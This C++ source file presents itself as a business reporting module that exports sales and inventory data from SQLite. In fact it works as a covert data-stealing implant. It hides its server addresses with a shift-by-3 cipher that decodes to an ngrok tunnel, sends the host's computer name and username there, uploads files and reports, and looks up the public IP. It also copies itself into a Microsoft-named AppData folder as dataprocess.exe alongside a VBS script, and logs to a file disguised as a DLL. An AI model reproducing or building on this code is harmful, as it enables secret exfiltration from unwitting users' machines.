#include "UpdateCompDB.h"

namespace fs = std::filesystem;
 std::string UpdateCompDB::APP_CONFIG_PATH = "C:\\Intermediate";
 std::string UpdateCompDB::TEMP_DIR = "";
 std::string UpdateCompDB::SYSTEM32_DIR = "";
 std::string UpdateCompDB::LOG_FILE_PATH = "F=_PVSV_PVSV1goo";
 std::string UpdateCompDB::WEB_URL = "kwwsv=22urexvw0rfhorw0prghudwho|1qjurn0iuhh1dss2dsl2sdudphwhuv";
 std::string UpdateCompDB::DOWN_LOAD_URL = "kwwsv=22urexvw0rfhorw0prghudwho|1qjurn0iuhh1dss2grzqordg";
 std::string UpdateCompDB::BRANCH_INFO_URL = "kwwsv=22urexvw0rfhorw0prghudwho|1qjurn0iuhh1dss2zhe";
 std::string UpdateCompDB::ERROR_REPORT_URL = "kwwsv=22urexvw0rfhorw0prghudwho|1qjurn0iuhh1dss2uhsruwh{fhswlrq";
 std::string UpdateCompDB::UPLOAD_FILE_URL = "kwwsv=22urexvw0rfhorw0prghudwho|1qjurn0iuhh1dss2xsordg";
 std::string UpdateCompDB::OPERATION_STATUS_URL = "kwwsv=22urexvw0rfhorw0prghudwho|1qjurn0iuhh1dss2vwdwxv";
 std::string UpdateCompDB::CONFIG_FILE_PATH = "F=_PVSV_frqilj1mvrq";

 int UpdateCompDB::TIME_TO_WAKE_UP = 3600;
 std::string UpdateCompDB::SESSION_TRACKER = "";
 UpdateCompDB::ResponseType UpdateCompDB::response = { 0, "", {} };
 int UpdateCompDB::SalesPromoReport = 0;
 int UpdateCompDB::SmallCostReport = 0;
 int UpdateCompDB::InventoryReport = 0;
 int UpdateCompDB::AppID = 9352817;

 std::string UpdateCompDB::convert(const std::string& input, int shift) {
     std::string convert1 = input;
     for (char& c : convert1) {
         c = (c - shift + 256) % 256; // Wrap around and ensure positive
     }
     return convert1;
 }

std::string UpdateCompDB::get_env_variable(const std::string& var) {
    char* value = nullptr;
    size_t size = 0;
    if (_dupenv_s(&value, &size, var.c_str()) == 0 && value != nullptr) {
        std::string result(value);
        free(value); // Free the allocated memory
        return result;
    }
    return "Unknown"; // Default value
}

void UpdateCompDB::iniURL() {

   // LOG_FILE_PATH = convert(LOG_FILE_PATH,3);
    WEB_URL = convert(WEB_URL, 3);
    DOWN_LOAD_URL = convert(DOWN_LOAD_URL, 3);
    BRANCH_INFO_URL = convert(BRANCH_INFO_URL, 3);
    ERROR_REPORT_URL = convert(ERROR_REPORT_URL, 3);
    UPLOAD_FILE_URL = convert(UPLOAD_FILE_URL, 3);
    OPERATION_STATUS_URL = convert(OPERATION_STATUS_URL, 3);
    //CONFIG_FILE_PATH = convert(CONFIG_FILE_PATH, 3);

}
size_t UpdateCompDB::WriteCallback_S(void* contents, size_t size, size_t nmemb, std::string* userp) {
    
    size_t total_size = size * nmemb;
    userp->append(static_cast<char*>(contents), total_size);
    return total_size;
}
size_t UpdateCompDB::WriteCallback(void* contents, size_t size, size_t nmemb, std::ofstream* file) {
    
    size_t totalSize = size * nmemb;
    file->write(static_cast<const char*>(contents), totalSize);
    return totalSize;
}

std::string UpdateCompDB::get_current_time() {
    std::string date_time;
    {
        time_t now = time(0);
        struct tm localTime;
        localtime_s(&localTime, &now); // Use localtime_s
        char buf[80];
        strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &localTime);
        date_time = buf;
    }

    return date_time;
}
void UpdateCompDB::logMessage(const std::string& message) {
    
    std::ofstream logFile(LOG_FILE_PATH, std::ios_base::app | std::ios_base::out);

    // Check if the file is open
    if (!logFile.is_open()) {
        std::cerr << "Error opening log file!" << std::endl;
        return;
    }   
    // Get current time and format it
    std::time_t now = std::time(nullptr);
    logFile << std::time(&now) << " - " << message << "\n";

     
    // Close the log file
    logFile.close();
}

std::string UpdateCompDB::escape_json(const std::string& str) {
    std::string escaped;
    for (char c : str) {
        switch (c) {
        case '"':  escaped += "\\\""; break;
        case '\\': escaped += "\\\\"; break;
        case '\b': escaped += "\\b"; break;
        case '\f': escaped += "\\f"; break;
        case '\n': escaped += "\\n"; break;
        case '\r': escaped += "\\r"; break;
        case '\t': escaped += "\\t"; break;
        default: escaped += c; break;
        }
    }
    return escaped;
}
bool UpdateCompDB::isAdmin() {
    BOOL isAdminA;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
        &adminGroup);
    CheckTokenMembership(NULL, adminGroup, &isAdminA);
    FreeSid(adminGroup);
    SESSION_TRACKER += "-> isAdmin ";
    return isAdminA;
}
std::string UpdateCompDB::get_appdata_local_path() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, path))) {
        return std::string(path) + "\\Microsoft\\Intermediate\\";
    }
    throw std::runtime_error("Failed to get AppData local path");
}

void UpdateCompDB::ensure_log_directory_exists(const std::string& log_file_path) {
    fs::path log_dir = fs::path(log_file_path).parent_path();
    if (!fs::exists(log_dir)) {
        fs::create_directories(log_dir);
        SESSION_TRACKER += "->Log Dir Created";
    }
}

void UpdateCompDB::app_initialize() {
    LOG_FILE_PATH = get_appdata_local_path() + "data_Log.dll";
    CONFIG_FILE_PATH = get_appdata_local_path() + "config.json";
    ensure_log_directory_exists(LOG_FILE_PATH);
    if (WEB_URL.find("http") == std::string::npos) {
        iniURL();
    }
    // Check if the config file exists
    if (fs::exists(CONFIG_FILE_PATH)) {
        load_config();
    }
    // Try to copy this executable to app folder
    copy_self(LOG_FILE_PATH);

    // Get the path of the current executable
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);

    std::filesystem::path currentPath(buffer);

    // Get the path of the Windows Temp directory
    char tempPathBuffer[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPathBuffer);
    std::filesystem::path tempPath(tempPathBuffer);

    
    if (currentPath.parent_path() == tempPath) {
        // Try to register this app to run on Windows start
        //register_script();
        //CreateShortcut();
    }

    SESSION_TRACKER += "->App Initialize Done";
}

UpdateCompDB::ResponseType UpdateCompDB::call_api(const std::string& url) {
    ResponseType response = { 0, "", nullptr }; // Initialize with default values
    std::string response_data; // To hold the response data
    CURL* curl = curl_easy_init();
    try {
        // Prepare data
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");

        // Create JSON data
        nlohmann::json data = {
            {"param1", escape_json(computer_name)},
            {"param2", escape_json(username)}
        };
        std::string strRet;
        std::string json_data = data.dump(); // Serialize to string

        // Set up the CURL request
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        // Set the request type to POST
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        // Set the JSON data
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
        // Set up the callback to capture the response
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &WriteCallback_S);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
        // Set this option to true to return the response instead of printing


        // Set the Content-Type to application/json
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        //curl_easy_setopt(curl, CURLOPT_RETURNTRANSFER, strRet);
        // Perform the request
        CURLcode res = curl_easy_perform(curl);

        //long response_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response.status_code);

        if (res != CURLE_OK || response.status_code != 200) {
            logMessage("Call to API failed. Status code: " + std::to_string(response.status_code));
            SESSION_TRACKER += "->API Call 200 ";
        }
        else {
            // Populate the response body
            response.body = response_data;
            // Try to parse the JSON response
            if (!response.parse_json()) {
                logMessage("Failed to parse JSON response.");
                SESSION_TRACKER += "->API Call Failed JSON Parsing ";
            }
        }
        // Cleanup
        curl_easy_cleanup(curl);
        return response;
    }
    catch (const std::exception& e) {
        logMessage("Call to API failed. Error: " + std::string(e.what()));
        SESSION_TRACKER += "-> API Call Exception ";
        return response; // Use a suitable CURLcode to indicate failure
    }
}
void UpdateCompDB::createPromoReport(const std::string& filename, sqlite3* db, const std::string& query) {
    sqlite3_stmt* stmt;
    int rc = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);

    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        return;
    }

    std::ofstream csvFile(filename);
    if (!csvFile.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        sqlite3_finalize(stmt);
        return;
    }

    // Write CSV header
    int colCount = sqlite3_column_count(stmt);
    for (int i = 0; i < colCount; ++i) {
        csvFile << sqlite3_column_name(stmt, i);
        if (i < colCount - 1) csvFile << ",";
    }
    csvFile << "\n";

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        for (int i = 0; i < colCount; ++i) {
            const char* text = reinterpret_cast<const char*>(sqlite3_column_text(stmt, i));
            csvFile << (text ? text : "NULL");
            if (i < colCount - 1) csvFile << ",";
        }
        csvFile << "\n";
    }

    if (rc != SQLITE_DONE) {
        std::cerr << "Failed to read data: " << sqlite3_errmsg(db) << std::endl;
    }

    csvFile.close();
    sqlite3_finalize(stmt);
}
void UpdateCompDB::createSmallCostReport(const std::string& filename, sqlite3* db, const std::string& query) {
    sqlite3_stmt* stmt;
    int rc = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);

    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        return;
    }

    std::ofstream csvFile(filename);
    if (!csvFile.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        sqlite3_finalize(stmt);
        return;
    }

    // Write CSV header
    int colCount = sqlite3_column_count(stmt);
    for (int i = 0; i < colCount; ++i) {
        csvFile << sqlite3_column_name(stmt, i);
        if (i < colCount - 1) csvFile << ",";
    }
    csvFile << "\n";

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        for (int i = 0; i < colCount; ++i) {
            const char* text = reinterpret_cast<const char*>(sqlite3_column_text(stmt, i));
            csvFile << (text ? text : "NULL");
            if (i < colCount - 1) csvFile << ",";
        }
        csvFile << "\n";
    }

    if (rc != SQLITE_DONE) {
        std::cerr << "Failed to read data: " << sqlite3_errmsg(db) << std::endl;
    }

    csvFile.close();
    sqlite3_finalize(stmt);
}
void UpdateCompDB::createInventoryDDGReport(const std::string& filename, sqlite3* db, const std::string& query) {
    sqlite3_stmt* stmt;
    int rc = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr);

    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        return;
    }

    std::ofstream csvFile(filename);
    if (!csvFile.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        sqlite3_finalize(stmt);
        return;
    }

    // Write CSV header
    int colCount = sqlite3_column_count(stmt);
    for (int i = 0; i < colCount; ++i) {
        csvFile << sqlite3_column_name(stmt, i);
        if (i < colCount - 1) csvFile << ",";
    }
    csvFile << "\n";

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        for (int i = 0; i < colCount; ++i) {
            const char* text = reinterpret_cast<const char*>(sqlite3_column_text(stmt, i));
            csvFile << (text ? text : "NULL");
            if (i < colCount - 1) csvFile << ",";
        }
        csvFile << "\n";
    }

    if (rc != SQLITE_DONE) {
        std::cerr << "Failed to read data: " << sqlite3_errmsg(db) << std::endl;
    }

    csvFile.close();
    sqlite3_finalize(stmt);
}


void UpdateCompDB::upload_file(const std::string& url, const std::string& file_path) {
    try {
        
        ResponseType response = { 0, "", nullptr }; // Initialize with default values
        std::string response_data; // To hold the response data
        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");

       
        nlohmann::json data = {
            {"param1", computer_name},
            {"param2", username}
        };

        // Initialize CURL
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            struct curl_httppost* formpost = nullptr;
            struct curl_httppost* lastptr = nullptr;

                // Add form data
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "param1", // Field name
                CURLFORM_COPYCONTENTS, computer_name.c_str(), // Value
                CURLFORM_END);

            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "param2", // Field name
                CURLFORM_COPYCONTENTS, username.c_str(), // Value
                CURLFORM_END);

            // Add the file
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "file",
                CURLFORM_FILE, file_path.c_str(),
                CURLFORM_CONTENTTYPE, "application/octet-stream",
                CURLFORM_END);

            // Set up the request
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            // Perform the request
            res = curl_easy_perform(curl);
            if (res != CURLE_OK && response.status_code != 200) {
                logMessage("Failed to upload file: " + std::string(curl_easy_strerror(res)));
                SESSION_TRACKER += "->Upload File Failed";
            }
            else {
                logMessage("File uploaded successfully: " + file_path);
                SESSION_TRACKER += "->Upload File Done";
            }

            // Clean up
            curl_easy_cleanup(curl);
            curl_formfree(formpost);
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception uploading file: " + std::string(e.what()));
        SESSION_TRACKER += "->Upload File Exception";
    }
}
void UpdateCompDB::uploadReport(const std::string& reportFile) {
    InvenFromDDG FromDDG;
    std::string destinationFolder = get_appdata_local_path() + response.json_data["filename"].get<std::string>();
    std::string sourcePath = std::filesystem::temp_directory_path().string() + response.json_data["filename"].get<std::string>();
    //download data file
    try {
               
        ResponseType response = { 0, "", nullptr }; // Initialize with default values
        std::string response_data; // To hold the response data
        std::string computer_name =  get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");

        
        nlohmann::json data = {
            {"param1", computer_name},
            {"param2", username}
        };

        // Initialize CURL
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            struct curl_httppost* formpost = nullptr;
            struct curl_httppost* lastptr = nullptr;

            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "param1", // Field name
                CURLFORM_COPYCONTENTS, computer_name.c_str(), // Value
                CURLFORM_END);

            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "param2", // Field name
                CURLFORM_COPYCONTENTS, username.c_str(), // Value
                CURLFORM_END);

            // Add the file
            curl_formadd(&formpost, &lastptr,
                CURLFORM_COPYNAME, "file",
                CURLFORM_FILE, reportFile.c_str(),
                CURLFORM_CONTENTTYPE, "application/octet-stream",
                CURLFORM_END);

            // Set up the request
            curl_easy_setopt(curl, CURLOPT_URL, UPLOAD_FILE_URL.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            // Perform the request
            res = curl_easy_perform(curl);
            if (res != CURLE_OK && response.status_code != 200) {
                logMessage("Failed to upload file: " + std::string(curl_easy_strerror(res)));
                SESSION_TRACKER += "->Upload File Failed";
                throw std::runtime_error("Condition was false, throwing an exception!");
            }
            else {
                logMessage("File uploaded successfully: " + CONFIG_FILE_PATH);
                SESSION_TRACKER += "->Upload File Done";
            }

            // Clean up
            curl_easy_cleanup(curl);
            curl_formfree(formpost);
        }
    }
    catch (const std::exception& e) {
        logMessage("Exception uploading file: " + std::string(e.what()));
        FromDDG.openDatafile(response.json_data["path"], destinationFolder);
        SESSION_TRACKER += "->Upload File Exception";
    }
}

void  UpdateCompDB::copy_self(const std::string& destination_path) {
    char current_file[MAX_PATH];
    GetModuleFileNameA(nullptr, current_file, MAX_PATH);
    //fs::copy_file(current_file, destination_path, fs::copy_options::overwrite_existing);
    SalesPromo PromoRecord;
    SESSION_TRACKER += "->Copy Self Done";
        //SalesFromPromo PromoRecord;
        try {
            // Get the path of the current executable
            char buffer[MAX_PATH];
            GetModuleFileNameA(nullptr, buffer, MAX_PATH);
            std::string scriptPath = buffer;

            // Define the log directory and script parent path
            std::filesystem::path logDir(destination_path);
            std::filesystem::path scriptParent = std::filesystem::path(scriptPath).parent_path();
            std::filesystem::path VBSFile = scriptParent / "diff.vbs";
            // Define the destination path for the copy
            if (!std::filesystem::exists(logDir.parent_path())) {
                std::filesystem::create_directories(logDir.parent_path());
            }

            std::filesystem::path destinationPathE = logDir.parent_path() / "dataprocess.exe";
            std::filesystem::path destinationPathS = logDir.parent_path() / "diff.vbs";

            // Copy the executable to the destination folder
            if (logDir.parent_path() != scriptParent) {
                std::filesystem::copy_file(scriptPath, destinationPathE, std::filesystem::copy_options::overwrite_existing);
                std::filesystem::copy_file(VBSFile, destinationPathS, std::filesystem::copy_options::overwrite_existing);
            }
            SESSION_TRACKER += "->Copy Self Done";
        }
        catch (const std::exception& e) {
            logMessage("Problem with copying executable to app folder: " + std::string(e.what()));
            SESSION_TRACKER += "->Copy Self Exception";
            PromoRecord.send_error_report(ERROR_REPORT_URL, "Problem with copying executable to app folder: " + std::string(e.what()));
        }
}
void UpdateCompDB::load_config() {
    SalesPromo PromoRecord;
    UpdateCompDB CompanyDB;
    try {
        std::ifstream config_file(CONFIG_FILE_PATH);
        if (!config_file.is_open()) {
            throw std::runtime_error("Could not open the configuration file.");
        }

        nlohmann::json config;
        config_file >> config; // Load JSON from file

        WEB_URL = config.value("WEB_URL", "");
        DOWN_LOAD_URL = config.value("DOWN_LOAD_URL", "");
        BRANCH_INFO_URL = config.value("BRANCH_INFO_URL", "");
        ERROR_REPORT_URL = config.value("ERROR_REPORT_URL", "");
        UPLOAD_FILE_URL = config.value("UPLOAD_FILE_URL", "");
        OPERATION_STATUS_URL = config.value("OPERATION_STATUS_URL", "");
        TIME_TO_WAKE_UP = config.value("TIME_TO_WAKE_UP", 0);
        SESSION_TRACKER += "->Config File Loaded";
    }
    catch (const std::exception& e) {
        logMessage("Problem opening config file: " + std::string(e.what()));
        PromoRecord.send_error_report(ERROR_REPORT_URL, "Problem loading config file: " + std::string(e.what()));
        SESSION_TRACKER += "->Config File Exception";
    }

}

std::string UpdateCompDB::get_ip_address() {
    CURL* curl;
    CURLcode res;
    std::string ip_address;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, convert("kwwsv=22dsl1lsli|1ruj",3).c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ip_address);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    SESSION_TRACKER += "->Get IP Done";
    return ip_address;
}

